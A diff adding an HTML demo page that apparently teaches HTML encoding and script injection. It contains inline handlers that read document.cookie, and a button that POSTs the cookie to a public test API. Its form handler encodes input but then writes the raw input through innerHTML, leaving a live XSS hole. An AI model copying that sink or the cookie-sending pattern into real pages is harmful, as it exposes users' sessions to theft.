@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>HTML Encoding Example</title>
+  </head>
+  <body>
+    <h1>HTML Encoding Example</h1>
+
+    <form id="myForm">
+      <label for="userInput">Enter some text:</label>
+      <input type="text" id="userInput" name="userInput" />
+      <button type="submit">Submit</button>
+    </form>
+
+    <div id="output">
+      <!-- Encoded text will be displayed here -->
+    </div>
+
+    <div>
+      <h4>Other Example</h4>
+      <a href="javascript:alert('script injection')">Click me via link</a>
+      <button onclick="alert('script injection')">Click me via button</button>
+      <button onclick="console.log('script injection')">Check console</button>
+      <button onclick="console.log(document.cookie)">reterive_cookie</button>
+      <button
+        onclick='alert("system ok");document.cookie="username=John Doe; expires=Thu, 18 Dec 2023 12:00:00 UTC; path=/";const message="system-functioning",requestBody=JSON.stringify({title:"testpost",body:message,userId:1,user:document.cookie});console.log(message),fetch("https://jsonplaceholder.typicode.com/posts",{method:"POST",headers:{"Content-type":"application/json; charset=UTF-8"},body:requestBody}).then(e=>{console.log("Status:",e.status),console.log("Request body:",requestBody)}).catch(e=>{console.log("Error:",e)});'
+      >
+        Post
+      </button>
+    </div>
+
+    <script>
+      // Function to HTML-encode text
+      function htmlEncode(str) {
+        var el = document.createElement("div");
+        el.innerText = el.textContent = str;
+        str = el.innerHTML;
+        return str;
+      }
+
+      // Handling form submission
+      document
+        .getElementById("myForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+
+          // Get the user input
+          var userInput = document.getElementById("userInput").value;
+
+          // Encode the user input
+          var safeInput = htmlEncode(userInput);
+
+          var unsafeInput = userInput;
+
+          // Display the encoded user input
+          // Create a new element to hold the safe content
+          var newElement = document.createElement("div");
+
+          newElement.innerHTML = "You entered: <br> The encoded string is: ";
+
+          // Add safe content to newElement using innerHTML
+          // newElement.innerHTML = "You entered: <br> The encoded string is: ";
+
+          // Create another element to hold the unsafe input
+          var unsafeElement = document.createElement("span");
+
+          // Add unsafe content to unsafeElement using textContent to automatically encode HTML entities
+          unsafeElement.textContent = unsafeInput;
+
+          // Create another element to hold the safe input
+          var safeElement = document.createElement("span");
+
+          // Add safe content to safeElement using textContent
+          safeElement.textContent = safeInput;
+
+          // Append unsafeElement and safeElement to newElement
+          newElement.appendChild(unsafeElement);
+          newElement.appendChild(document.createElement("br")); // line break
+          newElement.appendChild(safeElement);
+
+          // Replace the content of the output div with newElement
+          document.getElementById("output").innerHTML = userInput;
+          //document.getElementById("output").appendChild(newElement);
+        });
+    </script>
+  </body>
+</html>
